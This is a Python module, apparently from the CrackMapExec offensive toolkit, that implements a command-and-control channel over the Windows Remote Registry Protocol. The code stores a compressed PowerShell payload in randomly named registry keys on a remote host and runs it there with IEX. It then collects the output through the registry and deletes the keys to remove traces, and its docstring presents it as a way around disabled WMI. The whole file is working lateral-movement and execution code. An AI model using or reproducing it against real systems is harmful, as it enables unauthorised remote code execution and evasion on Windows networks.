import logging
from gevent import sleep
from impacket.dcerpc.v5 import rrp
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.examples.secretsdump import RemoteOperations
from cme.c2 import C2
from cme.helpers.powershell import ps_deflate_and_encode, ps_decode_and_inflate
from cme.helpers.misc import gen_random_string


class Registry(C2):
    '''
    Uses pure MS-RRP (Windows Remote Registry Protocol) as a C2 channel
    by storing payloads and outputs in registry keys

    This is useful for when WMI is disabled ;)
    '''

    def __init__(self, proto, payload, exec_methods, force_ps32, ret_output):
        C2.__init__(self, proto, payload, exec_methods, force_ps32, ret_output)

        #self.reg_payload_value_names = []
        self.reg_key_name = gen_random_string(8)
        self.reg_result_value_name = gen_random_string(8)
        self.reg_payload_value_name = gen_random_string(8)

        self.command_with_output = "$a = (Get-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\{key_name} -Name {pvalue_name}).{pvalue_name}; " \
                                   "$out = IEX (Invoke-Decompress -Data $a) | Out-String; " \
                                   "New-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\{key_name} -Name {ovalue_name} -Value (Invoke-Compress -Data $out)".format(key_name=self.reg_key_name, ovalue_name=self.reg_result_value_name, pvalue_name=self.reg_payload_value_name)

        self.command_without_output = "$a = (Get-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\{key_name} -Name {pvalue_name}).{pvalue_name}; " \
                                      "IEX (Invoke-Decompress -Data $a)".format(key_name=self.reg_key_name, pvalue_name=self.reg_payload_value_name)

        self.remoteOps = RemoteOperations(self.connection, False)
        self.remoteOps.enableRegistry()

        ans = rrp.hOpenCurrentUser(self.remoteOps._RemoteOperations__rrp)
        self.regHandle = ans['phKey']

    def chunkstring(self, string, length):
        return (string[0 + i:length + i] for i in range(1, len(string), length))

    def run(self):
        compressed_payload = ps_deflate_and_encode(self.create_ps_payload(self.payload))

        self.create_key()
        self.write(compressed_payload)
        self.execute_command(self.command_with_output if self.ret_output else self.command_without_output)
        self.get_output()
        self.cleanup()

        try:
            self.remoteOps.finish()
        except Exception as e:
            logging.debug("Error stopping remote registry: {}".format(e))

        return self.outputBuffer

    def create_key(self):
        rrp.hBaseRegCreateKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name + '\x00'))
        logging.debug('Created registry key {} successfully'.format(self.reg_key_name))

    def write(self, payload):
        #if len(payload) > 999999:
        #    for chunk in self.chunkstring(payload, 999999):
        #        self.write(chunk)
        #else:
        #value_name = gen_random_string(8)

        ans = rrp.hBaseRegOpenKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name + '\x00'))
        keyHandle = ans['phkResult']

        rrp.hBaseRegSetValue(self.remoteOps._RemoteOperations__rrp, keyHandle, self.reg_payload_value_name + '\x00', rrp.REG_SZ, payload)
        logging.debug('Wrote payload to registry value {}'.format(self.reg_payload_value_name))

        rrp.hBaseRegCloseKey(self.remoteOps._RemoteOperations__rrp, keyHandle)

        #self.command_with_output = self.command_with_output.replace('PVALUE_NAME', value_name)
        #self.reg_payload_value_names.append(value_name)

        #rtype, data = rrp.hBaseRegQueryValue(self.remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')

    def get_output(self):
        ans = rrp.hBaseRegOpenKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name + '\x00'))
        keyHandle = ans['phkResult']

        while True:
            try:
                dataType, output = rrp.hBaseRegQueryValue(self.remoteOps._RemoteOperations__rrp, keyHandle, self.reg_result_value_name + '\x00')
                self.outputBuffer = ps_decode_and_inflate(output)
                break
            except DCERPCException as e:
                logging.debug("Error while querying registry key with payload output {}: {}".format(self.reg_result_value_name, e))
                sleep(3)

        rrp.hBaseRegCloseKey(self.remoteOps._RemoteOperations__rrp, keyHandle)

    def cleanup(self):
        #self.reg_payload_value_names.append(self.reg_result_value_name)

        ans = rrp.hBaseRegOpenKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name + '\x00'))
        keyHandle = ans['phkResult']

        for value in [self.reg_payload_value_name, self.reg_result_value_name]:
            try:
                rrp.hBaseRegDeleteValue(self.remoteOps._RemoteOperations__rrp, keyHandle, value + '\x00')
                logging.debug('Registry value {} deleted successfully'.format(value))
            except DCERPCException as e:
                logging.debug('Error deleting registry value {}: {}'.format(value, e))
                break

        try:
            rrp.hBaseRegDeleteKey(self.remoteOps._RemoteOperations__rrp, keyHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name + '\x00'))
            logging.debug('Registry key {} deleted successfully'.format(self.reg_key_name))
        except DCERPCException as e:
            logging.debug('Error deleting registry key {}: {}'.format(self.reg_key_name, e))

        try:
            rrp.hBaseRegCloseKey(self.remoteOps._RemoteOperations__rrp, keyHandle)
        except DCERPCException:
            pass
